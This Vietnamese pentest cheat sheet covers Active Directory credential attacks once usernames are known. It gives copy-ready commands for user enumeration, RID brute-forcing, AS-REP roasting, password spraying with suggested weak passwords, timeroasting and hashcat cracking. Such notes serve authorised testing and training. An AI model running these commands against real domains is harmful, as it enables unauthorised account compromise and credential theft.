# 02 — Valid user (no password)

**Trạng thái:** có danh sách **username hợp lệ** nhưng chưa có mật khẩu.
**Mục tiêu:** ra `User + Pass` hoặc `Hash` (ASREP) để crack. Cột thứ 2 của mindmap.

---

## A. Bruteforce users (mở rộng danh sách user)

> **Khi nào chạy:** mới có vài tên, muốn xác nhận/mở rộng.
> **Tại sao:** biết user hợp lệ trước khi spray để không phí lượt và tránh lock.

```bash
kerbrute userenum -d <domain> <userlist>             # xác nhận user tồn tại (không lock)
nxc smb <dc_ip> --users                              # nếu có thể, lấy user từ DC
nxc smb <dc_ip> --rid-brute 10000                    # brute RID → user + group
```

- **Kết quả:** box **"Username"** đầy đủ hơn → spray hoặc AS-REP roast.

---

## B. AS-REP Roasting

> **Khi nào chạy:** có danh sách user; **không cần mật khẩu**.
> **Tại sao:** user bật cờ *Do not require Kerberos preauth* (`DONT_REQ_PREAUTH`)
> → bất kỳ ai cũng xin được AS-REP, phần mã hoá bằng khoá dẫn xuất từ mật khẩu
> user → crack offline.

```bash
# Không có credential, dùng danh sách user
GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>
nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>
# Từ Windows (đã trong domain)
Rubeus.exe asreproast /format:hashcat
```

- **Kết quả:** box **"Hash found ASREP"** — `$krb5asrep$23$user@DOMAIN:...`.
  Crack: `hashcat -m 18200 -a 0 hash.txt rockyou.txt`. Thành công → `User + Pass`.
- **Lọc user ASREP-roastable bằng BloodHound** (box mindmap):
  ```cypher
  MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u
  ```

---

## C. ASREQ Roast (biến thể)

> **Khi nào chạy:** cùng điều kiện; mindmap gọi box **"asreqroast"** → bắt hash
> trong luồng AS-REQ (thường qua Responder khi ép client).
> **Tại sao:** thu `Hash found ASREQ` để crack tương tự ASREP.

- **Kết quả:** box **"Hash found ASREQ"** → crack như ASREP (`-m 18200`).

---

## D. Password Spraying

> **Khi nào chạy:** có nhiều user, muốn thử **1 mật khẩu** cho tất cả.
> ⚠️ **Lấy chính sách khóa trước** (file 03 `--pass-pol`) để không lock tài khoản.
> **Tại sao:** password reuse/mật khẩu yếu rất phổ biến; spray tránh lock vì mỗi
> user chỉ bị thử 1 lần/vòng.

```bash
# NetExec — mindmap nhấn mạnh ⚠️ "user == password" và ⚠️ mật khẩu kiểu SeasonYear!
nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success
nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success  # user=pass theo dòng

# sprayhound (thêm --lower/--upper để biến đổi; không thêm gì = chỉ thử user==pass)
sprayhound -U <users.txt> -d <domain> -dc <dc_ip>
sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>

# kerbrute (nhanh, qua Kerberos)
kerbrute passwordspray -d <domain> <users.txt> <password>
```

- **Kết quả:** box **"Clear text Credentials" / "User + Pass"**. Dấu hiệu
  NetExec: `[+] corp.local\user:password`.
  - `STATUS_PASSWORD_MUST_CHANGE` = đúng pass nhưng phải đổi → `smbpasswd`/`changepasswd`.
  - `STATUS_ACCOUNT_LOCKED_OUT` = **dừng ngay**.
- **Mật khẩu nên thử** (mindmap gợi ý): `⚠️ usuals passwords (SeasonYear!,
  Company123, ...)`, user==user, `Welcome1`, mật khẩu đã crack từ user khác.

---

## E. TimeRoasting

> **Khi nào chạy:** không cần credential; DC trả về trong phản hồi NTP một MAC
> dẫn xuất từ mật khẩu **tài khoản máy**.
> **Tại sao:** thu hash tài khoản máy để crack (máy có mật khẩu yếu/pre-2000 thì
> crack được).

```bash
timeroast.py <dc_ip> -o <output_log>
```

- **Kết quả:** box **"timeroast hash"** (`$sntp-ms$…`) →
  `hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l`.

---

## Checklist "Valid user (no password)"

- [ ] Mở rộng danh sách user (kerbrute / rid-brute)
- [ ] AS-REP roast toàn bộ → crack `-m 18200`
- [ ] Lấy `--pass-pol` trước khi spray
- [ ] Spray: user==pass, SeasonYear!, mật khẩu mặc định
- [ ] TimeRoast nếu muốn hash tài khoản máy
- [ ] Có `User + Pass` → [file 03](03-valid-credentials-enum.md)
